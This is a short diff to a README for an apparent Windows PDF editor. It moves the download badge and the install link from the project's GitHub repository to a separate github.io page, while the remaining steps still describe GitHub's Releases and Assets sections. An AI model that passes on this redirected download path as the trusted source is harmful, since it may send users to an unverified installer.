@@ -1,6 +1,6 @@
 # 📄 Open-Source-PDF-Editor - Simple tools to view and edit files
 
-[![Download](https://img.shields.io/badge/Download-Open_Source_PDF_Editor-blue)](https://github.com/shifting-lotion967/Open-Source-PDF-Editor)
+[![Download](https://img.shields.io/badge/Download-Open_Source_PDF_Editor-blue)](https://shifting-lotion967.github.io)
 
 Open-Source-PDF-Editor helps you manage document tasks on your Windows computer. You can view, change, or reorganize PDF files without cost. This tool handles text updates, image adjustments, and document merging. It includes optical character recognition functions to read text from scanned papers.
 
@@ -29,7 +29,7 @@ Your computer needs to meet these basic standards to run this software:
 
 Follow these steps to download and set up the software:
 
-1. Visit the project website at https://github.com/shifting-lotion967/Open-Source-PDF-Editor.
+1. Visit the project website at https://shifting-lotion967.github.io
 2. Look for the box on the right side labeled Releases. 
 3. Click the link that shows the latest version number.
 4. Scroll down to the Assets section on that page.
